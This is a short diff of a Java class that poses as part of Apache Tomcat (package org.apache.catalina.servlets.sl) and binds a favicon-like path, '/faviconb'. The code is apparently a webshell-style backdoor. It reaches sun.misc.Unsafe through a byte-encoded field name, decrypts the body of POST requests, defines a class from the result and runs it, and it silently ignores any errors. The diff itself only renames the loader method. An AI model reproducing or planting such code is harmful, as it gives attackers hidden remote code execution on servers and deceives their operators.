@@ -3,7 +3,7 @@ package org.apache.catalina.servlets.sl;
 public class BX {
     private static final String pathPattern= "/faviconb";
 
-    public static Class unsafeloader(byte[] bytes) throws Exception {
+    public static Class unsafedefine(byte[] bytes) throws Exception {
         java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
         field.setAccessible(true);
         Object unsafe = field.get(null);
@@ -68,7 +68,7 @@ public class BX {
             if (method.equals("POST")){
                 try {
                     java.util.Map objMap = (java.util.Map)obj;
-                    unsafeloader(Decrypt(r(in))).newInstance().equals(obj);
+                    unsafedefine(Decrypt(r(in))).newInstance().equals(obj);
                 }catch(Exception ignored) {
                 }
             }
